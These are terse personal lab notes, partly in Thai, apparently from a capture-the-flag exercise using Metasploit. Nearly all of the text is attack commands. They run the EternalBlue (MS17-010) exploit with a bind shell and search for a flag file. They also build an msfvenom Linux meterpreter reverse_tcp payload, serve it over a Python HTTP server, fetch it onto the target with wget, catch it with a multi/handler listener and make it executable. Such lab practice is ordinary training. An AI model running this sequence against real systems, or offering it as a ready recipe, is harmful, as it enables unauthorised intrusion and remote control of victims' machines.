msfconsole
สามารถใช้ nmap ได้


search vulnerability
use auxiliary/scanner/vnc
use 2


Eternal blue
search ms17
use windows/smb/ms17_010_eternalblue
show payloads
set payload 2 -> payload => generic/shell_bind_tcp
show options
setg rhost 10.48.160.5
setg lhost xx.xxx.xx.xx
exploit
search flag.txt
search -f flag.txt
ls /user/jon/doc/flag.txt
cat /user/jon/doc/flag.txt


MSFVENOM
สร้างไฟล์ที่ attackbox
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=xx.xx.xxx.xx LPORT=7777 -f elf > rev_shell.elf
เปิดserverให้target download
python3 -m http.server 9000

ssh เข้าเครื่อง target 
wget http://xx.xx.xxx.xx:9000/rev_shell.elf

ตั้งlistener attackbox
msfconsole
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp 
set lhost xx.xx.xxx.xx
set lport 7777
show options
run

ในเครื่อง target
chmod 777 rev_shell.elf
./rev_shell.elf

